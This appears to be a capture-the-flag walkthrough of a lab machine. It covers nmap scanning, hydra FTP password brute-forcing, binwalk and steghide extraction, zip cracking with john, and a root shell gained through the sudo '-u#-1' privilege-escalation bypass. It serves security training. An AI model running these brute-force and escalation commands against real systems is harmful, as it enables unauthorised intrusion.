Enumeration

Firstly, we do a ping to see if the machine is active.

ping -c 1 10.10.126.126

Now that we know the machine is running it’s time to scan it and see which services are active.

sudo nmap -p- -sCV 10.10.126.126 -n -Pn --min-rate 5000 -oN Scan

Apache & FTP Brute force

The page shows a message that says we must provide a codename within the user-agent header so we can do it with curl.

curl -A "C" -L 10.10.126.126

After a couple of tries, find out that is the letter C.

The response gave us the user chris and say that the password is weak so it must be crackable with hydra.

hydra -l chris -P /usr/share/wordlists/rockyou.txt 10.10.126.126 ftp

With that credentials we can log into the FTP Server.

ftp 10.10.126.126

The FTP server has 2 jpg images and a note, but the interesting thing is in the images.

Steganography

Steganography is the practice of representing information within another message or physical object, in such a manner that the presence of the information is not evident to human inspection.

Binwalk

Binwalk is a tool for search binary images for embedded files and executable code.

If we inspect cutie.png with binwalk, we’ll see that there are some files hidden in it.

binwalk cutie.png

To extract the files we use -e parameter.

binwalk -e cutie.png

Binwalk generated a folder with 3 files inside. The most interesting thing is 8702.zip. But if we try to unzip it, we’ll find that it needs a password.

7z x 8702.zip

In order to crack the zip, we need to transform it into a hash to be able to crack it with john.

zip2john 8702.zip > hash

The hash should look like this.

8702.zip/To_agentR.txt:$zip2$*0*1*0*4673cae714579045*67aa*4e*61c4cf3af94e649f827e5964ce575c5f7a239c48fb992c8ea8cbffe51d03755e0ca861a5a3dcbabfa618784b85075f0ef476c6da8261805bd0a4309db38835ad32613e3dc5d7e87c0f91c0b5e64e*4969f382486cb6767ae6*$/zip2$:To_agentR.txt:8702.zip:8702.zip

To crack it, we execute john with the hash.

john hash

Now that we’ve got the password, we can unzip the file.

7z x 8702.zip

There is a note called To_agentR.txt.

The text in quotation marks is a base64 string.

echo "QXJlYTUx" | base64 -d

Once it’s decoded shows the word Area51.

Steghide

Steghide is a steganography program that is able to hide data in various kinds of images and audio-files.

The image cute-alien.png has hidden info as well, we can take a peek with steghide.

steghide info cute-alien.jpg

There is a file called message.txt, we’re extracting it with steghide again.

steghide extract -sf cute-alien.jpg

In the hidden file there are credentials that we can use to log into the ssh service.

Privilege escalation

We’re logging in with the user james.

ssh james@10.10.126.126

For comfort reasons, we can improve a little the shell setting up the TERM variable.

export TERM=xterm

There are two files in the directory, another image and an image that could be another steganography thing. We can download de file with scp: 

scp james@10.10.126.126:Alien_autospy.jpg .

If we take a look at the sudo permissions, we’ll find that we only have permissions over bash but it does’nt work.

sudo -l

Taking a look on the sudo version, we’ll find that it’s a vulnerable version.

sudo --version

Looking for the vulnerability found this page.

sudo -u#-1 bash

If the command is executed, we’ll gain a root shell.
